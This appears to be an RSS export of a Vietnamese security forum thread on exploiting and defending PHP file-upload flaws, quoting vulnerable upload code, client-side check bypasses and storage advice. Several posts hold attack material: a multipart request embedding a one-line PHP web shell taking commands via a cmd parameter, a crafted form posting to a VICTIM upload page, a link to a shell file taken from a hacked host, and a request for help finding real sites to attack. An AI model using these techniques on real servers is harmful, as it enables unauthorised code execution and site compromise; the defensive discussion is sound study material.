+ &lt;/html&gt;&nbsp;
+		</blockquote>
+
+<p></p>
+		<cite class="blockquote">hackerbinhphuoc wrote:</cite><br>
+		<blockquote>tắt chức năng sử dụng javascript đi hoặc là lưu file đó lại, đổi chữ "gif" bằng "php" được không nhỉ ?&nbsp;
+		</blockquote>
+Phức tạp và khó quá ~(X 
+
+--&gt; Anh trình thấp nên hay dùng làm như vầy, ko biết có đúng ko.Trên thanh AddressBar gõ:
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>javascript: function chkFileExtension&#40;&#41;{return true;}</pre>
+		</div>
+Sau đó làm gì tiếp ko biết luôn.
+:( ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153727</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153727</link>
+				<pubDate><![CDATA[Thu, 2 Oct 2008 15:54:09]]> GMT</pubDate>
+				<author><![CDATA[ gamma95]]></author>
+			</item>
+			<item>
+				<title>Re: Khai thác và phòng chống file upload trong PHP Web Applications</title>
+				<description><![CDATA[ @gamma95: FF chẳng hạn, nó có khá nhiều plugin giúp mình edit nội dung của page đang mở (dĩ nhiên là "nội dung" này nằm trong memory space của FF trên máy mình) ngay trên trình duyệt.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153728</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153728</link>
+				<pubDate><![CDATA[Thu, 2 Oct 2008 15:55:08]]> GMT</pubDate>
+				<author><![CDATA[ nbthanh]]></author>
+			</item>
+			<item>
+				<title>Re: Khai thác và phòng chống file upload trong PHP Web Applications</title>
+				<description><![CDATA[ @gamma95: anh trình thấp,còn em trình còi, chưa học qua môn java nên em vào tool &gt; Options&gt; Content &gt; tiện tay bỏ check cái Enable Java script (trên FF) luôn!
+rồi sau đó upload lên tự dưng nó báo "File was successfully uploaded."
+<blockquote>Mấu chốt giải quyết vấn để làm thế nào an toàn trong file upload đó là lưu giữ file upload lên một nơi mà không thể truy cập bởi user thông qua URL&nbsp;
+		</blockquote>
+em nghĩ là đó chỉ là giải pháp cho các website lớn, quản trị cả sever, còn đối với phần lớn các website vừa và nhỏ dùng host share thì giải pháp tốt nhất là cấm chạy script trong folder uploads ( tuy nhiên không tránh được trường hợp upload sang folder khác hoặc include files)]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153785</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153785</link>
+				<pubDate><![CDATA[Thu, 2 Oct 2008 21:08:31]]> GMT</pubDate>
+				<author><![CDATA[ hackerbinhphuoc]]></author>
+			</item>
+			<item>
+				<title>Re: Khai thác và phòng chống file upload trong PHP Web Applications</title>
+				<description><![CDATA[ Sẵn có bài này, mình gửi lên cho các bác cái PDF này luôn, cũng khá đầy đủ :D gần như step by step :D]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25298.hva#155190</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25298.hva#155190</link>
+				<pubDate><![CDATA[Tue, 14 Oct 2008 11:12:58]]> GMT</pubDate>
+				<author><![CDATA[ hoahongtim]]></author>
+			</item>
+			<item>
+				<title>Re: Khai thác và phòng chống file upload trong PHP Web Applications</title>
+				<description><![CDATA[ trong truong hop khi upload len server , web nó sửa ten file thanh ten khác , va dấu link di -&gt; hết chuyện!:D ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25298.hva#155513</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25298.hva#155513</link>
+				<pubDate><![CDATA[Thu, 16 Oct 2008 18:24:06]]> GMT</pubDate>
+				<author><![CDATA[ attain]]></author>
+			</item>
+			<item>
+				<title>Re: Khai thác và phòng chống file upload trong PHP Web Applications</title>
+				<description><![CDATA[ Mình có 1 thắc mắc nhỏ thế này: các image hosting cung cấp link direct thì họ phòng chống chuyện chèn mã độc này bằng cách nào?]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25298.hva#155524</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25298.hva#155524</link>
+				<pubDate><![CDATA[Thu, 16 Oct 2008 20:35:59]]> GMT</pubDate>
+				<author><![CDATA[ learn2hack]]></author>
+			</item>
+			<item>
+				<title>Re: Khai thác và phòng chống file upload trong PHP Web Applications</title>
+				<description><![CDATA[ Theo ngu ý của em, sao ko kiểm tra đuôi file ở trên server luôn nhỉ? Sau đó lưu lại tên file dạng *.xyz --&gt;tên file đặc biệt
+; sau đó lưu tên file đặc biệt này cùng với tên &quot;thiệt&quot; của nó vào 1 database, khi down sẽ trả lại tên thiệt cho nó?]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25298.hva#155654</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25298.hva#155654</link>
+				<pubDate><![CDATA[Fri, 17 Oct 2008 23:08:31]]> GMT</pubDate>
+				<author><![CDATA[ pham.channhan]]></author>
+			</item>
+			<item>
+				<title>Re: Khai thác và phòng chống file upload trong PHP Web Applications</title>
+				<description><![CDATA[ hix , sao cai bufsuite cua minh no' ko bắt được gói tin nào zay? có cần phải cài đặt , setting.. ntn chỉ giùm mình với! thanks a lot]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25298.hva#157833</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25298.hva#157833</link>
+				<pubDate><![CDATA[Wed, 5 Nov 2008 19:09:12]]> GMT</pubDate>
+				<author><![CDATA[ attain]]></author>
+			</item>
+			<item>
+				<title>Re: Khai thác và phòng chống file upload trong PHP Web Applications</title>
+				<description><![CDATA[ @pham.channhan: lưu tên như vậy là 1 cách phòng mã độc, nhưng mà khi người ta truy cập -&gt; tốn xử lý code trước khi xuất file -&gt; nặng, không hiệu quả.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25298.hva#159437</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25298.hva#159437</link>
+				<pubDate><![CDATA[Wed, 19 Nov 2008 07:09:43]]> GMT</pubDate>
+				<author><![CDATA[ daotranbang]]></author>
+			</item>
+			<item>
+				<title>Re: Khai thác và phòng chống file upload trong PHP Web Applications</title>
+				<description><![CDATA[ Theo mình thì get header biết định dạng file rồi đổi tên tên file + ext là xong.
+
+Còn coder duyệt khi hiển thị ra thì hiện phần nội dung mà cò file hiện ra nó hiện như thế nào thì co sao đâu:
+
+Hoặc  cách thứ 2 : có thể dùng str_replace('_','.',$_FILE['upload']['name']) . ext .... nhiều cách nên đâu có zi phải xủ lý ở đây đâu
+
+Ví dụ: file được đổi tên thành 86786SADS6768.pdf thì khi save thì ai muốn dổi tên thì đổi.
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25298.hva#174855</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25298.hva#174855</link>
+				<pubDate><![CDATA[Thu, 26 Mar 2009 14:09:06]]> GMT</pubDate>
+				<author><![CDATA[ micr0vnn]]></author>
+			</item>
+			<item>
+				<title>Re: Khai thác và phòng chống file upload trong PHP Web Applications</title>
+				<description><![CDATA[ Cho mình hỏi muốn để burp suite bên dưới trình duyệt FF có chũ P on/off giống của seamoun thì làm thế nào vậy]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25298.hva#178611</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25298.hva#178611</link>
+				<pubDate><![CDATA[Sun, 26 Apr 2009 18:58:46]]> GMT</pubDate>
+				<author><![CDATA[ dangminh4]]></author>
+			</item>
+			<item>
+				<title>Re: Khai thác và phòng chống file upload trong PHP Web Applications</title>
+				<description><![CDATA[ Em đang thực hành vụ này mấy a cho em hỏi như sau:
+trên server em thực hành thì nó chỉ cho upload file dạng đuôi .doc ... em dùng burpsuite_v1.2 chặn lại được para rồi em sữa khúc sau:
+
+-----------------------------7d92ce23906f2
+Content-Disposition: form-data; name="spec"; filename="C:\Documents and Settings\User\Desktop\test.doc"
+Content-Type: application/msword
+
+&lt;?
+system($_GET['cmd']);
+?&gt;
+-----------------------------7d92ce23906f2
+Content-Disposition: form-data; name="specFileName"
+
+test.doc
+
+-----------
+em đã thêm dòng &lt;?system($_GET['cmd']);?&gt; rồi forward đi forward thành công luôn nhưng khi bật 1 khung IE khác em gõ<span class="link"> http://website/upload/test.doc?cmd=netstat</span> -an thì trang web nó hiện lên khung download file .doc này chứ ko thực thi đoạn lệnh system kia vậy em bị sai ở đâu dạ? các giúp em với ạ ... em cũng download file .doc này về và mở dạng code ra coi thử thì có dòng &lt;?system($_GET['cmd']);?&gt; nhưng ko biết tại sao nó ko chạy được hix]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25298.hva#178753</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25298.hva#178753</link>
+				<pubDate><![CDATA[Mon, 27 Apr 2009 19:10:12]]> GMT</pubDate>
+				<author><![CDATA[ woodenhouse]]></author>
+			</item>
+			<item>
+				<title>Khai thác và phòng chống file upload trong PHP Web Applications</title>
+				<description><![CDATA[ Anh ơi, cho em hỏi, nếu muốn chống file upload thì cấm truy cập vào thư mục đó. Vậy nếu đó là một thư mục chứa ảnh của các album thành viên thì các thành viên sẽ ko truy cập đc ạ :|]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25298.hva#188421</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25298.hva#188421</link>
+				<pubDate><![CDATA[Sun, 2 Aug 2009 13:29:06]]> GMT</pubDate>
+				<author><![CDATA[ myname2]]></author>
+			</item>
+			<item>
+				<title>Re: Khai thác và phòng chống file upload trong PHP Web Applications</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">dangminh4 wrote:</cite><br>
+		<blockquote>Cho mình hỏi muốn để burp suite bên dưới trình duyệt FF có chũ P on/off giống của seamoun thì làm thế nào vậy&nbsp;
+		</blockquote>
+EM cũng muốn hỏi! Ai làm được giải thích dùm với :(]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25298.hva#199887</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25298.hva#199887</link>
+				<pubDate><![CDATA[Sat, 5 Dec 2009 14:19:08]]> GMT</pubDate>
+				<author><![CDATA[ Mũ Trắng]]></author>
+			</item>
+			<item>
+				<title>Khai thác và phòng chống file upload trong PHP Web Applications</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">seamoun wrote:</cite><br>
+		<blockquote><font color='orange'><b>I. GIỚI THIỆU</b></font>
+Ứng dụng Web hỗ trợ cho phép người sử dụng thực hiện upload file lên server hiện tại có rất nhiều. Ví dụ như upload image(*.gif, *.jpg), *.pdf, *.doc, ...
+Trong bài này seamoun sẽ trình bày một số lỗi khi lập trình file upload mà kẻ xấu có thể lợi dụng để upload những mã độc lên server. Những phương thức khai thác mà seamoun trình bày chỉ mang tính tham khảo không ủng hộ các bạn khai thác đối với những server bị mắc lỗi.
+ 
+<font color='orange'><b>II. KHAI THÁC LỖI UPLOAD FILE</b></font>
+1) Trường hợp sử dụng JavaScript để kiểm tra file upload
+Giả sử ta có kịch bản gồm 2 file như sau:
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>&lt;html&gt;
+&lt;title&gt;Secure file upload PHP Web Applications&lt;/title&gt;
+&lt;head&gt;
+&lt;script language=javascript&gt;
+function chkFileExtension&#40;&#41;
+{
+	var str=document.upload.userfile.value;
+	var ext=str.substring&#40;str.length,str.length-3&#41;;
+	if &#40; ext != "gif"&#41;
+	{
+		alert&#40;"File is invalid"&#41;;
+		return false;
+	}
+	else
+	{
+		return true;
+	};
+}
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;form name="upload" action="upload1.php" method="POST" ENCTYPE="multipart/form-data"  onSubmit="return chkFileExtension&#40;&#41;"&gt;
+Select the file to upload: &lt;input type="file" name="userfile"&gt;
+&lt;input type="submit" name="upload" value="upload"&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+		</div>
+
+
+
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>&lt;?php
+
+$uploaddir = 'uploads/';
+$uploadfile = $uploaddir . basename&#40;$_FILES&#91;'userfile'&#93;&#91;'name'&#93;&#41;;
+
+if &#40;move_uploaded_file&#40;$_FILES&#91;'userfile'&#93;&#91;'tmp_name'&#93;, $uploadfile&#41;&#41; {
+    echo "File was successfully uploaded.\n";
+} else {
+    echo "File uploading failed.\n";
+}
+?&gt;</pre>
+		</div>
+
+Ví dụ trên cho thấy người lập trình kiểm tra phần mở rộng file cho phép file upload bằng cách sử dụng một đoạn mã Javascript trong file upload1.html. Chỉ chấp nhận những file có phần mở rộng là *.gif thì mới được phép upload, cách này một kẻ tấn công dễ dàng vượt qua bằng cách sử dụng một intercepting proxy hoặc có thể viết một đoạn mã bằng Perl, Python,... mà đệ trình trực tiếp đến file upload1.php với những tham số cần thiết.
+
+Trong demo sau seamoun sử dụng Burp Suite là một tool rất mạnh khi thực hiện Web Application. Có thể download tại :<span class="link"> http://portswigger.net/</span>&nbsp;
+		</blockquote>
+
+
+---------------------------------------
+
+ Các anh có thể cho em hỏi 1 chút đc ko ạ ?
+Em mới tìm hiểu về các vấn đề ở trên các anh nói , em cũng muốn thực hiện xem khả năng tiếp thu của mình đến đâu , nhưng khi load toll Burp Suite về thì ko biết sử dụng ra sao ( vì thấy trong video demo toll này đã đc add luôn vào fifox rồi :( ) Vậy các anh có thể cho em biết , add Toll Burp Suite và Fifox như thế nào ,và hướng dẫn sử dụng PM cụ thể ra sao được ko ạ ? 
+ Em cảm ơn các anh !]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25298.hva#204321</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25298.hva#204321</link>
+				<pubDate><![CDATA[Sun, 31 Jan 2010 23:39:25]]> GMT</pubDate>
+				<author><![CDATA[ vinh_k5cna2]]></author>
+			</item>
+			<item>
+				<title>Khai thác và phòng chống file upload trong PHP Web Applications</title>
+				<description><![CDATA[ Theo tôi tìm hiểu thì các dịch vụ upload ảnh dùng static server để lưu file. Cái này hình như là một phần lỗi cấu hình mặc định của Apache 1.x, 2.x đã sửa rồi. Có làm kiểu: *.php.gif hay chèn mã php vào file ảnh cũng chẳng khai thác được gì.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25298.hva#206350</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25298.hva#206350</link>
+				<pubDate><![CDATA[Sat, 6 Mar 2010 15:38:06]]> GMT</pubDate>
+				<author><![CDATA[ beta14]]></author>
+			</item>
+			<item>
+				<title>Khai thác và phòng chống file upload trong PHP Web Applications</title>
+				<description><![CDATA[ Trong trường hợp 1 có thể tạo 1 trang upload với nội dung sau:
+<font color='yellow'>&lt;form name="upload" action="http://VICTIM/upload1.php" method="POST" ENCTYPE="multipart/form-data"&gt;
+ Select the file to upload: &lt;input type="file" name="userfile"&gt;
+ &lt;input type="submit" name="upload" value="upload"&gt;
+&lt;/form&gt;
+</font>Sau đó lưu lại thành .html rồi upload. Hoặc có thể dùng chức năng gõ lệnh javascrip trên thanh Address với cú pháp:
+ <font color='red'>javascript:[Mã nhúng 1 form upload hoặc 1 mã độc nào đó]</font>]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25298.hva#217369</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25298.hva#217369</link>
+				<pubDate><![CDATA[Mon, 2 Aug 2010 10:03:19]]> GMT</pubDate>
+				<author><![CDATA[ huyannet]]></author>
+			</item>
+			<item>
+				<title>Khai thác và phòng chống file upload trong PHP Web Applications</title>
+				<description><![CDATA[ Thanks bác seamoun, tiện thể các bác cao thủ nào có thể chỉ giáo thêm các lỗ hổng khác với, mình thấy có một website: http://iwast.securitas.com.vn/iwast/ cho test các lỗ hổng khác nhưng khả năng mình chỉ đến case 7 (SQLi) và case 6 (XSS) thôi, mong các bác HELP]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25298.hva#278033</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25298.hva#278033</link>
+				<pubDate><![CDATA[Fri, 9 Aug 2013 05:15:25]]> GMT</pubDate>
+				<author><![CDATA[ itshield]]></author>
+			</item>
+			<item>
+				<title>Khai thác và phòng chống file upload trong PHP Web Applications</title>
+				<description><![CDATA[ Thanks bác seamoun đã share tut bằng clip thật hay.
+
+
+Cánh đây hơn 1 tuần...Một trang web khách hàng sử dụng host share bị xoá sạch toàn bộ thông tin trên host (source code, file image,...vv).
+
+Kiếm tra trên host thấy có file php được đặt tên sex69.php (../public_html/sex69.php). Lấy file này về local chạy thử thấy nói như là 1 cái tool khá mạnh. 
+
+Các bác cho hỏi làm thế nào họ lại đưa được file php lên host của mình ? lên đứng thư mục chủ luôn public_html/sex69.php
+
+Tam có share file php tại link: http://www.mediafire.com/download/trc2q7aot8acpn9/file_php_sex69.rar
+
+Bác nào biết xin chỉ giúp. Cảm ơn các bác nhiều]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25298.hva#278565</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25298.hva#278565</link>
+				<pubDate><![CDATA[Thu, 26 Sep 2013 22:38:03]]> GMT</pubDate>
+				<author><![CDATA[ tam_itvn]]></author>
+			</item>
+			<item>
+				<title>Re: Khai thác và phòng chống file upload trong PHP Web Applications</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">seamoun wrote:</cite><br>
+		<blockquote>4) Trường hợp kiểm tra phần mở rộng của file trên server với đoạn mã sau:
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>&lt;?php
+
+$blacklist = array&#40;&quot;.php&quot;, &quot;.phtml&quot;&#41;;
+
+foreach &#40;$blacklist as $item&#41; {
+   if&#40;preg_match&#40;&quot;/$item\$/i&quot;, $_FILES&#91;'userfile'&#93;&#91;'name'&#93;&#41;&#41; {
+       echo &quot;We do not allow uploading PHP files\n&quot;;
+       exit;
+   }
+}
+
+$uploaddir = 'uploads/';
+$uploadfile = $uploaddir . basename&#40;$_FILES&#91;'userfile'&#93;&#91;'name'&#93;&#41;;
+
+if &#40;move_uploaded_file&#40;$_FILES&#91;'userfile'&#93;&#91;'tmp_name'&#93;, $uploadfile&#41;&#41; {
+    echo &quot;File is valid, and was successfully uploaded.\n&quot;;
+} else {
+    echo &quot;File uploading failed.\n&quot;;
+}
+?&gt;</pre>
+		</div>
+
+Như vậy với đoạn mã người lập trình đã ngăn chặn kẻ tấn công không thể upload file *.php lên server. Tuy nhiên trường hợp này cũng chưa an toàn với những server mà có cấu hình file *.gif, *.jpg cho phép xử lý PHP. Do vậy kẻ tấn công vẫn upload file gif, jpg lên server nhưng có chèn thêm mã độc vào.
+<font color='orange'><b>
+III. CÁCH PHÒNG CHỐNG</b></font>
+Mấu chốt giải quyết vấn để làm thế nào an toàn trong file upload đó là lưu giữ file upload lên một nơi mà không thể truy cập bởi user thông qua URL. Điều này có thể thực hiện được bằng cách lưu file upload bên ngoài thưc mục webroot hoặc trên web server nhưng từ chối truy cập đến thư mục đó.
+
+Tài liệu tham khảo: Secure File Upload In PHP Web Applications - ScanIt
+Công cụ sử dụng: Burp Suite <span class="link"> http://portswigger.net/</span>)&nbsp;
+		</blockquote>
+nói thật là bác up bài này, có khuyến cáo sợ người khác sử dụng sai mục đích, nhưng theo em là bác đã lo xa quá thừa, bởi clip bác làm quá ngắn gọn, ko có file word hướng dẫn kèm theo, web demo đã có sẵn do bác tạo ra , tất cả mọi thứ đều chung chung và quá mơ hồ đối với newbie, mà em ko hiểu bác viết bài này để giúp các newbei như em, hay là để nói với những người đã biết nữa, em thấy để xem clip của bác mà hiểu thì chắc là người ta phải biết hack thông qua lỗi upshell và hiểu sâu sắc rồi , mà những cái loại ý thì chắc chả buồn down clip của bác làm cái gì nữa nhỉ, người đọc topic của bác là những newbie mới đọc thôi, em có chút góp ý như vậy có gì không phải thì cũng thôi, tính em là em nói thẳng, làm gì cũng phải hướng đến người dùng, đã ko làm thì thôi, chứ đã có ý giới thiệu cho người ta biết thì nên làm sao cho nó rõ ràng rành mạch, còn sợ mất nghề tốt nhất ko up. sau đây em xin viết ra 1 vài thắc cmn mắc của em sau khi down tạm 1 cái clip của bác về xem, em là newbie nhé , có thể khó tránh khỏi vài lỗi cơ bản, nhưng thế mới là newbie :
+1/ web bác demo là web nào
+2/ web bác tấn công là web nào
+3/ cơ chế như thế nào
+4/ web của bác do bác tạo ra nên bác có sẵn file shell trên đó, vậy newbie thì dùng cái gì để thực hành
+5/ 1 trang web bình thường tìm mãi không thấy chỗ upload cái gì đó lên, vậy mà trong csdl của nó vẫn có file shell, vậy có phải rõ ràng web đó do chính người design đưa file shell vào csdl để làm mẫu hướng dẫn hay ko ? vì nếu csdl ko có sắn thì gõ link ko bao h ra, như 1 web site đơn giản gõ vào nó như mọi web khác, nhưng có thêm đuôi /wp-includes/css/byg.php chẳng hạn thì nó lại sẽ ra 1 link với giao diện hoàn toàn khác và đã có sắn shell trên đó. 
+=&gt;vấn đề newbie đặt ra là : làm thế nào để tìm được 1 web có thể cho upshell, phải có tools chứ, ko lẽ google để nghĩ ra vài cái tên lạ lạ thử tét sao :v và rồi khi đã upshell thành công thì tiến hành chạy shell đó như thế nào. newbie thì cần biết những cái đó đó. còn bác viết bài này đối với những người xem là newbie = con số 0 tròn chĩnh . ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25298.hva#278987</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25298.hva#278987</link>
+				<pubDate><![CDATA[Mon, 11 Nov 2013 08:00:21]]> GMT</pubDate>
+				<author><![CDATA[ hocquantrimang]]></author>
+			</item>
+	</channel>
+</rss>
